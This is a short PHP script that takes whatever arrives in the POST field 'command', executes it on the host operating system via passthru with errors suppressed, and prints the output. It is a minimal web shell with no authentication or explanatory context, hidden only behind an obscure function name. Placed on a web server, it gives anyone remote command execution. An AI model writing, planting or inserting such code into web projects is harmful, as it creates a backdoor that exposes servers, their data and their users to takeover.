<?php
function exTKL() {
	$in=$_POST['command'];
	if (!$in == '') {
		$out = '';
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
		echo $out;
	}
}

exTKL();
?>